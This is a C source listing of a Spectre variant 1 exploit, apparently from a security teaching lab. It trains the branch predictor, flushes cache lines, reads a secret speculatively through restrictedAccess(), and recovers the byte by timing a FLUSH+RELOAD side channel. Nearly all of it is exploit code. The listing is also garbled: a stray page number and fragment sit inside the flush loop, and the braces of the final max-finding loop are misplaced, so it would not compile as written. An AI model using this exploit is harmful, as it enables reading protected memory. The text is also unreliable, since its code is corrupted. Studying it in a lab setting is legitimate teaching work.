static int scores[256];
void reloadSideChannelImproved()
{
int i;
volatile uint8_t *addr;
register uint64_t time1, time2;
int junk = 0;
for (i = 0; i < 256; i++) {
addr = &array[i * 4096 + DELTA];
time1 = __rdtscp(&junk);
junk = *addr;
time2 = __rdtscp(&junk) - time1;
if (time2 <= CACHE_HIT_THRESHOLD)
scores[i]++; /* if cache hit, add 1 for this value */
}
}
void spectreAttack(size_t larger_x)
{
int i;
uint8_t s;
for (i = 0; i < 256; i++)
12
{ _mm_clflush(&array[i*4096 + DELTA]);s }
// Train the CPU to take the true branch inside victim().
for (i = 0; i < 10; i++) {
_mm_clflush(&buffer_size);
restrictedAccess(i);
}
// Flush buffer_size and array[] from the cache.
_mm_clflush(&buffer_size);
for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
// Ask victim() to return the secret in out-of-order execution.
s = restrictedAccess(larger_x);
array[s*4096 + DELTA] += 88;
}
int main()
{
int i;
uint8_t s;
size_t larger_x = (size_t)(secret-(char*)buffer);
flushSideChannel();
for (i = 0; i < 256; i++) scores[i] = 0;
for (i = 0; i < 1000; i++) {
spectreAttack(larger_x);
reloadSideChannelImproved();
}
int max = 0;
for (i = 0; i < 256; i++){
if(scores[max] < scores[i])
}
max = i;
printf("Reading secret value at %p = ", (void*)larger_x);
printf("The secret value is %d\n", max);
printf("The number of hits is %d\n", scores[max]);
return (0);
}
